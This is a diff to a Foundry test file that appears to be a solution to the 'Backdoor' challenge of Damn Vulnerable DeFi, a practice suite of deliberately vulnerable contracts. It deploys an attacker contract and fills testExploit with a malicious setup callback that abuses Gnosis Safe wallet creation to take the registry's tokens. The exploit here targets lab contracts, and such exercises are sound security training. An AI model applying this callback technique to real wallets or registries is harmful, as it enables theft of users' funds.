@@ -5,6 +5,7 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
+import {BackdoorAttack} from "../../../src/Contracts/attacker-contracts/BackdoorAttack.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
@@ -15,6 +16,7 @@ contract Backdoor is Test {
 
     Utilities internal utils;
     DamnValuableToken internal dvt;
+    BackdoorAttack internal backdoorAttack;
     GnosisSafe internal masterCopy;
     GnosisSafeProxyFactory internal walletFactory;
     WalletRegistry internal walletRegistry;
@@ -67,12 +69,30 @@ contract Backdoor is Test {
         // Transfer tokens to be distributed to the registry
         dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
 
+        backdoorAttack = new BackdoorAttack(
+            attacker,
+            address(walletFactory),
+            address(masterCopy),
+            address(walletRegistry),
+            address(dvt)
+        );
+
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
 
+        string memory signatureString = "setupToken(address,address)";
+        bytes memory maliciousCallback = abi.encodeWithSignature(
+            signatureString,
+            address(dvt),
+            address(backdoorAttack)
+        );
+
+        backdoorAttack.attack(users, maliciousCallback);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
